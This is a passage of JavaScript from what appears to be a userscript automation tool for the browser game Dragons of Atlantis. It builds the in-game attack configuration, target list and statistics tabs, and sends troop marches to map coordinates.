				result = Marches.getMarchTime(a.x, a.y, Data.options.attacks.units[a.level]) - Marches.getMarchTime(b.x, b.y, Data.options.attacks.units[b.level]);
				break;
		}
		return result;
	},

	checkAttack : function ( target, callback )
	{
		var t = Tabs.Attacks;
		
		var city_id = Seed.cities[0].id;
		var city_idx = 0;
		var available_general;
		
		// check units
		var units = Data.options.attacks.units[target.level].cloneProps();
		
		var total_units = 0;
		for (var unit_type in units)                                               
		{
			if ( units[unit_type] > 0 )
			{
				total_units += units[unit_type];
				if ( Units.getUnitNumbers(city_idx,unit_type).incity < units[unit_type] )
				{
					callback (translate('Not enough') +' '+ translate(unit_type));
					return;
				}
			}
		}
		
		if ( total_units <= 0 ){
			callback (translate('No Troops Defined'));
			return;
		}
		
		if ( total_units > Seed.cities[0].figures.marches.maximum_troops ) {
			callback (translate('Too many troops for muster point level'));
			return;
		}

		if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 ){
			callback (translate('Muster Point') +' '+ translate('Full'));
			return;
		}
		
		// Check & Set Available General
		available_general = getAvailableGeneral ( target.level === 1 );
		if ( available_general === null ){
			callback ( translate('Generals') + ' ' + translate('Unavailable') );
			return;
		}
		
		// If there is some dragon selected, but none are available to send, cancel the request
		if ( !Dragons.chooseOneDragon(units) )
		{
			if ( options.onFailure )
			{
				// We return the notice to the function sendAttack to delay the next attempt
				options.onFailure ( { errmsg: translate('Dragon') + ' ' + translate('Unavailable') } );
			}
			return;
		}
		
		
		var attack_msg =  translate('Manual attack sent to') + ': ' + translate(Data.options.map.selected) + ' ' + translate('Level') + ' ' + target.level + ' ' +  translate('at') + ' ' + target.x +'/'+ target.y;
		
		var attack_msg_log =  'Manual attack sent to: ' + Data.options.map.selected + ' Level ' + target.level + ' at ' + target.x +'/'+ target.y;
		
		verboseLog(attack_msg_log +' Attempted');
		
		new MyAjax.marches ({
			city_id    : city_id,
			x          : target.x,
			y          : target.y,
			general_id : available_general.id,
			units      : units,
			owner_id   : 'attacks',
			delay      : 3000,
			
			onSuccess  : function ( r ) {
				
				Marches.add(r.job.march_id, 'attacks');
				
				Data.options.marches.requests.counter++;
				
				var xy = target.x + ',' + target.y;
				if ( !Map.states[ xy ] ) {
					Map.states[ xy ] = {};
				}
				Map.states[ xy ].last_attack = serverTime();
				
				verboseLog(attack_msg_log +' Successfully');
				t.dispFeedback(attack_msg);
				
				if ( Data.options.attacks.log_attacks ) {
					actionLog(attack_msg);
				}
				
				callback(null);
			},
			
			onFailure  : function ( r ) {
			
				if (r.status && r.status === 509)
				{
				/*
					if ( Data.options.marches.requests.counter > 30 ) {
						Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
					}
				*/
				}

				verboseLog(attack_msg_log +' <b>failed and returned</b> error: '+ r.errmsg);

				t.dispFeedback (translate('Error') + ': ' + r.errmsg);

				callback(null);
			},
			caller : 'Tabs.Attacks.checkAttack'
		});
	},
	

	
	//*** Attacks Tab - Levels Sub-Tab ***
	//----------------------------------------------------------------------------
	tabLevels : function ()
	{
		var t = Tabs.Attacks;
		
		var city = Seed.cities[0];
		
		if ( ! t.targets.length ) {
			t.getActiveObjectList();
			t.targets_page_number = 1;
		}

		// New content area here
		var html = 
		 '<div id=' + setUID('Tabs.Attacks.tabLevels.title') +' class="' + UID['title'] + '">' + translate('Attacks') + '&nbsp;' + translate(Data.options.map.selected) + '</div>';
		 
		// MapChoice Selector
		setUID('Tabs.Attacks.tabLevels.selectMap');
		html += '<table>'
		+ '<tr>'
		+ '	<td align=right>&nbsp;'
		+ '		<b>' + translate('Choose') + '</b>'
		+ '	</td>'
		+ '	<td>&nbsp;:'
		+ '		<select id=' + UID['Tabs.Attacks.tabLevels.selectMap'] + '>';
		
		var section = 1;
		var selected;
		for (var type in Map.targets)
		{
			selected = '';
			if ( type === 'City' || type === 'Forest' ) {
				html += '<option disabled="disabled">-----------------------</option>';
				section++;
			}

			if ( type === Data.options.map.selected ) {
				t.target_category = section;
				selected = 'selected'
			}

			html += 
			  '<option value="' + type + '" section="' + section + '" ' + selected + '>'
			+ translate(type) 
			+ '</option>';
		}
		
		html += 
		+ '		</select>'
		+ '	</td>'
		+ '	<td>'
		+ '	<span class=jewel>'
		+ '	<div id=' + setUID('Tabs.Attacks.tabLevels.targetsInfo') + ' style="padding-left:5px;">' + translate('Targets') + ':&nbsp;<b>' + t.targets.length + '</b>&nbsp;' + translate('of') + '&nbsp;<b>' + Map.targets[ Data.options.map.selected ].length +'</b></div>'
		+ '	</span>'
		+ '	</td>'
		+ '</tr>'
		+ '</table>';
		
		html +=
		 '<div style="height:380px; overflow-y:auto">'
		+'	<table class="' + UID['compact_table'] + ' ' + UID['hide_inputbox'] +'">'
		+'		<tr class=' + UID['row_top_headers'] + '>'
		+'			<td style="background:none !important;"></td>'
		+'			<td align=center colspan=11>&nbsp;' + translate('Levels') + '&nbsp;</td>'
		+'		</tr>'
		+'		<tr>'
		+'			<td></td>'
		+'			<th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th>'
		+'		</tr>'
		+'		<tr align=center>'
		+'			<td align=right>' + translate('Enable') + ' </td>';
		
		for (var x=1; x < 12; x++){
			html += 
			 '		<td>'
			+'		<label style="display:block;' + (Data.options.attacks.level_enable[x] ? ' background:#2A7' : '') +'">'
			+'		<input type=checkbox id=' + setUID('Tabs.Attacks.tabLevels.level_enable_' + x) + ' ref=' + x + ' ' + (Data.options.attacks.level_enable[x] ? ' checked' : '') + ' />'
			+'		</label>'
			+'		</td>';
		}
		
		html +=
		 '		</tr>'
		+'		<tr align=center>'
		+'			<td align=right>' + translate('Max') + ' ' + translate('Distance').truncate(4,'') + ' </td>';
		
		for (var x=1; x < 12; x++){
			html +=
			  '		<td>'
			 +'		<input type=text id=' + setUID('Tabs.Attacks.tabLevels.level_dist_' + x) + ' ref=' + x + ' size=2 style="width:25px;" value="' + Data.options.attacks.level_dist[x] + '"/>'
			+'		</td>';
		}
		
		html +=
		 '		</tr><tr>'
		+'				<td><div class=short></div></td>'
		+'			</tr>';
		
		var current_units = [];
		for (i=0; i < t.units_type.length; i++)
		{
			if ( Units.getUnitNumbers(city, t.units_type[i]).total )
			{
				var color = 'rgba(255,255,255,0.8)';
				if ( i < 5 ) color = 'rgba(210,210,210,0.8)';
				else if ( i < 8 ) color = 'rgba(190,240,190,0.8)';
				else if ( i < 10 ) color = 'rgba(240,240,190,0.8)';
				else if ( i < 12 ) color = 'rgba(190,190,240,0.8)';
				else if ( i < 16 ) color = 'rgba(200,190,250,0.8)';
				else color = 'rgba(240,190,190,0.8)';
				
				html +=
				 '	<tr style="background-color:' + color + ';">'
				+'		<td class=jewel title="' + translate(t.units_type[i]) + '" align=right valign=middle>'
				+ 			translate('~' + t.units_type[i]).substring(0,5)
				+'			<span class="' + UID['doa-icons'] + ' i-' + t.units_type[i] + '"></span>'
				+'		</td>';
				
				for (var x=1; x < 12; x++)
				{
					var num = Data.options.attacks.units[x][t.units_type[i]];
										
					if ( !num ) { num = 0; }
					
					html += 				
					 '<td>'
					+'<input type=text id=' + setUID('Tabs.Attacks.tabLevels.level_units_' + x + '_' + i) + ' ref=' + (x + '_' + i) + ' maxlength=6 size=2 style="width:36px;' + (num ? '' : 'color:#888;') + '" value="' + num + '" title="' + translate('Total') + ': ' + getTotalUnits(x) + '" />'
					+'</td>';
				}
				html += '</tr>';
				current_units.push(i);
			}
		}
		
		// Add Dragons (by Didi)
		
		// Check if some dragon have requirements ready to attack
		var show_dragons = false;
		for ( var dragon_type in Dragons.all_dragons )
		{
			if ( Dragons.all_dragons[dragon_type] &&  Dragons.all_dragons[dragon_type].can_attack && dragon_type !== 'SpectralDragon' ){
				show_dragons = true;
				break
			}
		}
		
		var current_dragons = [];
		if ( show_dragons ) 
		{
			html += 
			  '<tr><td colspan=12 style="background:none !important;">&nbsp;</td></tr>'
			+ '<tr>'
			+ '  <td>&nbsp;</td>'
			+ '  <th colspan=11 align=center>' + translate('Send') + ' ' + translate('Dragon') + ' ' + translate('Available') + '</th>'
			+ '</tr>'
			
			var dragons = getKeys(Dragons.all_dragons);
			dragons.sort(function(a,b){return Dragons.all_dragons[a].index - Dragons.all_dragons[b].index;});
			for ( var i = 0; i < dragons.length ; i++)
			{
				var dragon = Dragons.all_dragons[ dragons [i] ];
				if ( dragon && dragon.can_attack && dragon.name !== 'SpectralDragon' )
				{

					html +=
					 '<tr align=center style="background:rgba(240,190,190,0.8);">'
					+'	<td class=jewel align=right valign=middle title="'+ translate( dragon.name ) + '">'
					+	 	translate( '~' + dragon.name ).substring(0,5)
					+'		<span class="' + UID['doa-icons'] + ' i-' + dragon.name + '"></span>'
					+'	</td>';
					
					for (var x=1; x < 12; x++){
						
						var num = Data.options.attacks.units[x][dragon.name];
						if (!num){ num = 0;	}
    	
						html += 
						 '	<td>'
						+'	<label style="display:block;">'
						+'	<input type=checkbox id=' + setUID('Tabs.Attacks.tabLevels.dragon_enable_' + x + '_' + dragon.name) + ' ref=' + (x + '_' + dragon.name) + ' ' +( num !== 0 ?' checked' : '' ) +' />'
						+'	</label>'
						+'	</td>';
					
					}
					html += '</tr>';
					current_dragons.push(dragon.name);
				}
			}
		} 

		html += '</table></div>';

		
		$J('#'+UID['Tabs.Attacks.content']).html( html );

		// add event listeners ...
		
		$J('#'+UID['Tabs.Attacks.tabLevels.selectMap']).change( onMapChoice );
		
		for (var x=1; x < 12; x++)
		{
			$J('#'+UID['Tabs.Attacks.tabLevels.level_enable_' + x]).change( onChangeLevelEnable );
			$J('#'+UID['Tabs.Attacks.tabLevels.level_dist_' + x]).change( onChangeDistance );
		}
		
		for ( i=0; i < current_units.length; i++ )
		{
			for ( var x=1; x < 12; x++ )
			{
				$J('#'+UID['Tabs.Attacks.tabLevels.level_units_'+ x +'_'+ current_units[i]]).change( onChangeUnits );
			}
		}
		
		//Dragon select (by Didi)
		if ( show_dragons ) {
			for ( i=0; i < current_dragons.length; i++ )
			{
				for ( var x=1; x < 12; x++ )
				{
					$J('#'+UID['Tabs.Attacks.tabLevels.dragon_enable_'+ x +'_'+ current_dragons[i]]).change( onChangeDragons );
				}
			}
		}
		

		function onChangeDistance ( event )
		{
			var x = parseIntZero($J(event.target).val());
			var n = $J(event.target).attr('ref');
			
			if ( isNaN(x) || x < 0 || x > 600 ){
				$J.msg({ 
					content : '<center>'
							+ translate('Distance must be between') + '<br>'
							+ ' 0 ' + translate('and') +' 600' + translate('miles')
							+ '</center>',
					timeOut	: 'words', /* Words per minute*/
					target	: t.container
				});
				
				x = Data.options.attacks.level_dist[n];
			} 
			Data.options.attacks.level_dist[n] = x;
			onChangeConfig();
		}
		
		function onMapChoice ( event )
		{
			var t = Tabs.Attacks;
			
			if (Data.options.attacks.enabled) 
			{
				/* It would be very bad to leave attack on when switching targets. 
					Imagine sending the units for a wilderness to a city or an ant camp...*/
				clearTimeout ( t.timer.attack ); t.timer.attack=null;
				t.setAttackEnable ( false );
				t.dispFeedback (translate('Safe Mode') +': '+ translate('Attacks') +' '+ translate('Disabled'));
			}
			
			var element = event.target;
			
			Data.options.map.selected = element.options[element.selectedIndex].value;
			
			var new_category = parseInt(element.options[element.selectedIndex].getAttribute( 'section' ));
			
			if ( new_category !== t.target_category ) {
				// change category : unselect all level
				for (var x=1; x < 12; x++){
					Data.options.attacks.level_enable[x]= 0;
					$J('#'+ UID['Tabs.Attacks.tabLevels.level_enable_' + x]).attr('checked', false);
					$J('#'+ UID['Tabs.Attacks.tabLevels.level_enable_' + x]).parent().css('background-color', '');
				}				
				t.target_category = new_category;
			}

			onChangeConfig();
		}
		
		function onChangeLevelEnable ( event )
		{
			var level = parseInt( event.target.getAttribute('ref') );
			Data.options.attacks.level_enable[level] = event.target.checked;
			event.target.parentNode.style.background = ( event.target.checked ? '#2A7' : 'none');
			onChangeConfig();
		}
		
		function getTotalUnits ( level )
		{
			var total=0;
			for ( var unit_type in Data.options.attacks.units[ level ] )
			{
				total += Data.options.attacks.units[ level ][unit_type];
			}
			return total;
		}
		
		function onChangeUnits ( event )
		{
			var args = event.target.getAttribute('ref').split('_');
			var level = args[0];
			var unit_type = t.units_type[ args[1] ];
			var units = parseIntZero(event.target.value);
			
			if ( isNaN(units) || units < 0 )
			{
				event.target.style.backgroundColor = '#faa';
				dialogError (translate('Invalid number of troops',t.container));
			}
			else {
				event.target.value = units;
				Data.options.attacks.units[ level ][ unit_type ] = units;
				var total_units = getTotalUnits(level);
				event.target.style.backgroundColor = '';
				if ( parseInt(event.target.value) > 0 )
				{
					event.target.style.color = '#000';
				}
				
				if ( total_units > Seed.cities[0].figures.marches.maximum_troops ) {
					event.target.style.backgroundColor = '#faa';
					dialogError (translate('Attack Maximum Troops', t.container));
				}
				
				t.tabLevels();
			}
		}
		
		// onChangeDragons (by Didi)
		function onChangeDragons ( event )
		{
			var args = event.target.getAttribute('ref').split('_');
			var level = args[0];
			var dragon_name = args[1]
			Data.options.attacks.units[ level ][ dragon_name ] = (event.target.checked ? 1 : 0);
		}

		// onChangeConfig (by Didi)
		function onChangeConfig()
		{
			var t = Tabs.Attacks;
			t.getActiveObjectList(); 
			$J('#'+UID['Tabs.Attacks.title']).html( translate('Attack') + ' ' + translate(Data.options.map.selected) );
			$J('#'+UID['Tabs.Attacks.tabLevels.title']).html( translate('Attacks') + '&nbsp;' + translate(Data.options.map.selected) );
			$J('#'+UID['Tabs.Attacks.tabLevels.targetsInfo']).html( translate('Targets') + ':&nbsp;<b>' + t.targets.length + '</b>&nbsp;' + translate('of') + '&nbsp;<b>' + Map.targets[ Data.options.map.selected ].length +'</b>' );
		}
	},


	//*** Attacks Tab - Targets Sub-Tab ***
	//----------------------------------------------------------------------------
	
	tabTargets : function ()
	{
		var t = Tabs.Attacks;

		if ( ! t.targets.length ) {
			t.getActiveObjectList();
			t.targets_page_number = 1;
		}
		
		if ( t.targets.length === 0 ){
			t.dispFeedback ( translate('Use the Levels Tab to select attack areas') );
		}
		
		$J('#'+UID['Tabs.Attacks.title']).html( translate('Attack') + ' ' + translate(Data.options.map.selected) );
		$J('#'+UID['Tabs.Attacks.content']).html( '<div id=' + setUID('Tabs.Attacks.tabTargets.content') + '></div>' );
	
		var html = '<div class=' + UID['title'] + '>'
			+ translate('Attacks') + '&nbsp;' + translate(Data.options.map.selected)
			+ '</div>';
		
		// MapChoice Selector
		setUID('Tabs.Attacks.tabTargets.selectMap');
		html += 
			'<table>'
		+ '	<tr>'
		+ '		<td align=right>&nbsp;<b>' + translate('Choose') + '</b>'
		+ '		</td>'
		+ '		<td>&nbsp;:'
		+ '			<select id=' + UID['Tabs.Attacks.tabTargets.selectMap'] + '>';
		
		var section = 1;
		var selected;
		for (var type in Map.targets)
		{
			selected = '';
			if ( type === 'City' || type === 'Forest' ) {
				html += '<option disabled="disabled">-----------------------</option>';
				section++;
			}

			if ( type === Data.options.map.selected ) {
				t.target_category = section;
				selected = 'selected'
			}

			html += 
			  '				<option value="' + type + '" section="' + section + '" ' + selected + '>'
			+ 				translate(type) 
			+ '				</option>';
		}
		
		html += 
			'			</select>&nbsp;'
		+ '		</td>';
		
		var level_dist = [];
		for (var i=1; i < Data.options.attacks.level_dist.length; i++)
		{
			if ( Data.options.attacks.level_enable[i] )
			{
				level_dist.push(Data.options.attacks.level_dist[i]);
			}
		}
		level_dist.sort( function(a,b){return a-b;} );
		var distance_range = (level_dist.first() !== level_dist.last()) ? level_dist.first() + ' - ' + level_dist.last() : level_dist[0];
		
		var map_type = Data.options.map.selected;
		var filter_enable = ( /(City|Outpost|Wildernesses)/.test( map_type ) );
		var show_type = ( map_type === 'Wildernesses' );
		var dist_base = !Data.options.attacks.order_by_time;
		
		var pages =	t.targets.length > t.max_targets_per_page;
		
		if (!pages ) {
			t.targets_page_number = 1;
		} else {
			t.targets_max_page = Math.ceil(t.targets.length / t.max_targets_per_page)
		}
		
		if ( filter_enable ){
			html += 
			  '	<td>' + translate('Filter') + ':&nbsp;</td>'
			+ '	<td>'
			+ '		<input type=text size=22 id=' + setUID('Tabs.Attacks.tabTargets.filter') + ' value="' + Data.options.attacks.filter_targets + '" />'
			+ '	</td>';
		}
		
		html += 
		  '	</tr>'
		+ '	<tr>'
		+ '		<td colspan=2 align=left>'
		+ '			<span class=jewel>' + t.targets.length + ' ' + translate('of') + ' ' + Map.targets[ map_type ].length + ' (' + translate('Distance') + ' ' + translate('Max') + ': ' + distance_range + ')</span>'
		+ '		</td>'
		+ '		<td colspan=2 align=right>'
		+ '			<span>' + (pages ? 
							'<input type=button id=' + setUID('Tabs.Attacks.tabTargets.Prev') + ' class="'+ UID['bnt_green'] + ' thin" value="<" />' 
		     			+ '&nbsp;' + (t.targets_page_number + '/' + t.targets_max_page) + '&nbsp;' 
							+ '<input type=button id=' + setUID('Tabs.Attacks.tabTargets.Next') + ' class="'+ UID['bnt_green'] + ' thin" value=">" />' 
							: '')
		+ '   	</span>'
		+ '		</td>'
		+ '	</tr>'
		+ '</table>'
		+ '<div style="width:490px;height:410px;">'
		+ '	<table id='+ setUID('Tabs.Attacks.tabTargets.table') +' class="' + UID['table'] + ' font8 zebra" style="width:490px;">'
		+ '   <thead class=fixed>'
		+ '		<tr>'
		+ '			<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_0') +' ref="'+ ( dist_base ? 'Distance' : 'March time') +'" style="width:40px;">'     
		+ ( dist_base ? translate('Distance').substring(0,4) : translate('March time').split(' ').join('<br/>') )
		+ '			</th>'
		+ '			<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_1') +' ref="Coordinates" style="width:40px;">' + translate('Coordinates').substring(0,5) + '</th>'
		+ ( show_type ? '<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_2') +' ref="Type" style="width:25px;">' + translate('Type') + '</th>' : '' )
		+ '			<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_3') +' ref="Level" style="width:20px;">'      + translate('Level').substring(0,3)       + '</th>'
		+ '			<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_4') +' ref="Last Attack" style="width:45px;">' + translate('Last Attack').split(' ').join('<br/>') +'</th>'
		+ '			<th style="width:50px;"></th>';
		
		if ( filter_enable ) {
			html += 
		  	'		<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_5') +' ref="Power" style="width:50px;">' + translate('Power') + '</th>'
			+ '		<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_6') +' ref="City" style="width:80px;">' + translate('City') + '</th>'
			+ '		<th id='+ setUID('Tabs.Attacks.tabTargets.table.th_7') +' ref="Alliance" style="width:105px;">' + translate('Alliance') + '</th>';
		}
		else {
			html += 
			  '		<th style="width:50px;"></th>'
			+ '		<th style="width:80px;"></th>'
			+ '		<th style="width:105px;"></th>';
		}
		
		html += 
		  '		</tr>'
		+ '   </thead>'
		+ '   <tbody class=scrollable style="height:370px;width:490px;">';
		
		var fisrt_target = (t.targets_page_number - 1) * t.max_targets_per_page;
		if ( fisrt_target > t.targets.length ) {
			t.targets_page_number = 1;
			fisrt_target = (t.targets_page_number - 1) * t.max_targets_per_page;
		}
		var last_target = ( t.targets.length < fisrt_target + t.max_targets_per_page ? t.targets.length : fisrt_target + t.max_targets_per_page);
		
		for (var i=fisrt_target; i < last_target; i++)
		{
			var type = t.targets[i].city_type ? Map.names.cities[ t.targets[i].city_type ] : Map.names.type[ t.targets[i].type ];
			var time = Marches.getMarchTime(t.targets[i].x, t.targets[i].y, Data.options.attacks.units[ t.targets[i].level] );
			if ( !dist_base && -1 == time ){ continue; }
		
			html +=	'<tr ' + (t.targets[i].attackable ? '' : 'class=' + UID['no-attackable'] + ' ');
			
			if ( t.targets[i].player_id )
			{
				html +=	'  title="'
				+ translate('City') + ': ' + t.targets[i].city_name +' \n'
				+ translate('Name') + ': ' + (t.targets[i].player_name || '???') + ' \n'
				+ translate('Power') + ': ' + t.targets[i].might +' \n'
				+ translate('Alliance') + ': ' + (t.targets[i].alliance || '---')
				+ '"';
			}
			
			html += '>'
			+'<td style="width:40px;">' 
			+( dist_base ? t.targets[i].dist : timeFormat (time,false,'NOCOLOR') )
			+'</td>'
			+'<td style="width:40px;" align=center>' 
			+ 	t.targets[i].x + '/' + t.targets[i].y 
			+'</td>'
			+ (show_type ? '<td style="width:25px;"><span class="' + UID['doa-icons'] + ' i-' + type + '"></span></td>' : '') 
			+'<td style="width:20px;" align=center>' 
			+	 t.targets[i].level
			+'</td>'
			+'<td style="width:45px;" align=right>'
			+'	<span id=' + setUID('Tabs.Attacks.tabTargets.last_attack_'+i) + '> --- </span>'
			+'</td>'
			+'<td style="width:50px;">'
			+ 	(t.targets[i].is_friend ? '' : '<input type=image id=' + setUID('Tabs.Attacks.tabTargets.attack_btn_'+i) + ' ref=' + i + ' class="'+ UID['doa-icons'] + ' i-Attacks" value="" />' ); //value=" ' + translate('Attack') + '! "
			
			// Add checkbox for enable/disable attack button on cities and outposts
			if ( t.targets[i].player_id )
			{
				if ( !t.targets[i].is_friend ){
					html += 
					'&nbsp;<input id=' + setUID('Tabs.Attacks.tabTargets.toggle_btn_'+i) + ' ref=' + i + ' type=checkbox ' + (t.targets[i].attackable ? 'checked' : '') +' />';
				}
				html += 
				 '</td>'
				+'<td style="width:50px;" align=right>'
				+ (t.targets[i].might > 1000 ? parseInt(t.targets[i].might/1000).intToCommas() + 'K' : t.targets[i].might.intToCommas())
				+'</td>'
				+'<td style="width:80px;">'
				+ (t.targets[i].city_name || '').truncate(14).replace('...','..')
				+'</td>'
				+'<td style="width:105px;">' 
				+ (t.targets[i].alliance || '-----').toString().truncate(20).replace('...','..');
			}
			else {
				html += 
				  '</td>'
				 +'<td style="width:50px;"></td>'
				 +'<td style="width:80px;"></td>'
				 +'<td style="width:105px;">';
			}
			
			html += '</td></tr>';

		}
		
		html +=
		 '   </tbody>'
		+'	</table>'
		+'</div>';

		var $content = $J('#'+UID['Tabs.Attacks.tabTargets.content']);
		
		$content.html( html );
		$content.css('height', ($content.parent().outerHeight() - 5) + 'px');
		
	
		// Add the event listeners
		
		if (pages) {
			if (t.targets_page_number > 1) {
				$J('#'+UID['Tabs.Attacks.tabTargets.Prev']).removeAttr('disabled');
				$J('#'+UID['Tabs.Attacks.tabTargets.Prev']).click(function(){
					t.targets_page_number--;
					t.tabTargets();
				});
			} else {
				$J('#'+UID['Tabs.Attacks.tabTargets.Prev']).attr('disabled', 'disabled');
			}
			if (t.targets_page_number < t.targets_max_page) {
				$J('#'+UID['Tabs.Attacks.tabTargets.Next']).removeAttr('disabled');
				$J('#'+UID['Tabs.Attacks.tabTargets.Next']).click(function(){
					t.targets_page_number++;
					t.tabTargets();
				});
			} else {
				$J('#'+UID['Tabs.Attacks.tabTargets.Next']).attr('disabled', 'disabled');
			}
		}
		$J('#'+UID['Tabs.Attacks.tabTargets.selectMap']).change( onMapChoice );
		for (var i = 0; i < 8 ; i++) {
			$J('#'+UID['Tabs.Attacks.tabTargets.table.th_'+i]).click(  {sort_target : $J('#'+UID['Tabs.Attacks.tabTargets.table.th_'+i]).attr('ref') }, onSortTargets );
		}
		
		$J('#'+UID['Tabs.Attacks.tabTargets.filter']).change(function() {
			
			if ( Data.options.attacks.enabled ) 
			{
				/* It would be very bad to leave attack on when switching targets. 
				Imagine sending the units for a wilderness to a city or an ant camp...*/
				clearTimeout ( t.timer.attack ); t.timer.attack=null;
				t.setAttackEnable ( false );
				t.dispFeedback ( translate('Safe Mode') +': '+ translate('Attacks') +' '+ translate('Disabled') );
			}
			
			Data.options.attacks.filter_targets = $J(this).val();

			t.getActiveObjectList();
			t.targets_page_number = 1;

			t.tabTargets();
		});
		
		for (var i=fisrt_target; i < last_target; i++) 
		{
			var but_attack = $id(UID['Tabs.Attacks.tabTargets.attack_btn_'+ i]);
			if ( !but_attack ) continue;
			
			$J(but_attack).click ( butAttackNow );
			
			if ( $J('#'+UID['Tabs.Attacks.tabTargets.toggle_btn_'+ i]) )
			{
				$J('#'+UID['Tabs.Attacks.tabTargets.toggle_btn_'+ i]).click ( toggleAttackable );
			}
			setButtonStyle ( but_attack, t.targets[i].attackable );
		}
		
		function onSortTargets( event )
		{
			var sort_target = event.data.sort_target;
			if ( sort_target && /(March|Distance|Level)/.test( sort_target ) ) {
				if (t.targets_sort_by === sort_target) {
					t.targets.reverse();
				} else {
					t.targets_sort_by = sort_target;
					t.targets.sort(t.targetsSort);
				}
				t.tabTargets();
			}
		}

		function setButtonStyle (element, enabled) 
		{
			if ( enabled ) {
				element.disabled = false;
				$J(element).removeClass(UID['bnt_image_red']);
				$J(element).addClass(UID['bnt_image_green']);
				//$J(element).css('backgroundColor','rgba(0,160,110,0.8)');
			}
			else {
				element.disabled = true;
				$J(element).removeClass(UID['bnt_image_green']);
				$J(element).addClass(UID['bnt_image_red']);
				//$J(element).css('backgroundColor','rgba(184,0,46,0.8)');
			}
		}
		
	
		function onMapChoice (event)
		{
			var t = Tabs.Attacks;
			
			if (Data.options.attacks.enabled) 
			{
				/* It would be very bad to leave attack on when switching targets. 
					Imagine sending the units for a wilderness to a city or an ant camp...*/
				clearTimeout ( t.timer.attack ); t.timer.attack=null;
				t.setAttackEnable ( false );
				t.dispFeedback (translate('Safe Mode') +': '+ translate('Attacks') +' '+ translate('Disabled'));
			}
			
			var element = event.target;
			
			Data.options.map.selected =  element.options[element.selectedIndex].value;
			
			var new_category = parseInt (element.options[element.selectedIndex].getAttribute( 'section' ));
			
			if ( new_category !== t.target_category ) {
				// change category : unselect all level
				for (var x=1; x < 12; x++){
					Data.options.attacks.level_enable[x]= 0;
				}				
				t.target_category = new_category;
			}

			t.getActiveObjectList();
			t.targets_page_number = 1;
			
			t.tabTargets();
		}

		function butAttackNow ( event )
		{
			var n = parseInt(event.target.getAttribute('ref'));
			
			$J.msg({ 
				content : translate('Attacking') + '...',
				target	: t.container,
				timeOut : 5000
			});

			t.checkAttack (t.targets[n], notify);
			function notify (r){
				if (r!==null){

				}
			}
		}
		
		function toggleAttackable ( event )
		{
			var n = parseInt(event.target.getAttribute('ref'));
			
			var xy = t.targets[n].x + ',' + t.targets[n].y;
			
			t.targets[n].attackable = Map.states[ xy ].attackable = event.target.checked;
			
			setButtonStyle ($id(UID['Tabs.Attacks.tabTargets.attack_btn_'+n]), t.targets[n].attackable);     
			event.target.parentNode.parentNode.className = ( t.targets[n].attackable ? '' : UID['no-attackable'] );
		}
		
		function targetsTick ()
		{
			var now = serverTime();
			
			for (var i=0; i < t.targets.length; i++)
			{
				var target_states = Map.states[ t.targets[i].x + ',' + t.targets[i].y ];
				
				//Didi modif : update attackable states 
				var xy = t.targets[i].x + ',' + t.targets[i].y;
				var old_states=t.targets[i].attackable;
				t.targets[i].attackable = target_states.attackable;
				if ( old_states !==  t.targets[i].attackable ) {
					var but_attack = $id(UID['Tabs.Attacks.tabTargets.attack_btn_'+ i]);
					setButtonStyle ( but_attack, t.targets[i].attackable );
				}
				
				if ( target_states && target_states.last_attack )
				{
					var time = now - target_states.last_attack;
					var time_format = timeFormat (time, false);
					if ( time > 3600 ) {
						time_format = '<font color=#550000><b>'+ time_format +'</b></font>';
					}
					$J('#'+UID['Tabs.Attacks.tabTargets.last_attack_'+i]).html( time_format );
				}
			}
		}
		
		if ( t.targets.length ){
			var delay;
			if ( t.targets.length < 50 ){
				delay = 1000;
			} else {
				delay = parseInt(t.targets.length/50*1000);
			}
			clearInterval ( t.timer.targets ); t.timer.targets=null;
			t.timer.targets = setInterval (targetsTick, delay);
		}
		
	},

	
	//*** Attacks Tab - Stats Sub-tab ***
	//----------------------------------------------------------------------------
	tabStats : function ()
	{
		var t = Tabs.Attacks;

		var html = 
		 '<div class=' + UID['title'] + '>' + translate('Statistics') + '</div>'
		+'<div id='+ setUID('Tabs.Attacks.tabStats.content') + ' class=' + UID['content'] + '></div>'
		+'<center><input id=' + setUID('Tabs.Attacks.tabStats.clear') + ' type=button value="' + translate('Delete') + ' ' + translate('Statistics') +'" /></center>';
		
		$J('#'+UID['Tabs.Attacks.content']).html( html );
		
		$J('#'+UID['Tabs.Attacks.tabStats.content']).css({
			height : $J('#'+UID['Tabs.Attacks.content']).innerHeight()-55 + 'px',
			marginBottom : '4px'
		});
		
		$J('#'+UID['Tabs.Attacks.tabStats.clear']).click(function(){
			t.clearStats();
			t.showStats();
		});

		t.showStats();
	},

	// byLevel.resources
	clearStats : function ()
	{
		var t = Tabs.Attacks;
		var now = serverTime();
		Data.stats.attacks = {
					 start_at	: now
					,run_time	: 0
					,total		: 0
					,items		: {
						 resources : {}
						,speedups  : {}
						,production: {}
						,general   : {}
						,chest     : {}
						,arsenal   : {}
						,armors    : {}
						,others	  : {}
						,trooops   : {}
					}
					,levels			: [
						 '' /* the index zero is not used because the levels are from 1 to 11 */
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
					]
		};
				
		t.running.start_at = now;

		t.showStats(); 
	},
	
	// called when battle report received
	trackStats : function (march_id, r)
	{
		var t = Tabs.Attacks;
		if ( DEBUG_MARCHES ) {
			debugLog ('Tabs.Attacks.trackStats: '+ march_id);
		}
		var level = r.report.location.level;
		
		if (level < 1 || level > 12) {
			level = 0;
		}
		
		++Data.stats.attacks.total;
		++Data.stats.attacks.levels[level].total;
		
		var resources =  r.report.spoils.resources;
		for (var type in resources)
		{
			objAddTo ( Data.stats.attacks.items.resources, type, parseInt(resources[type]) );
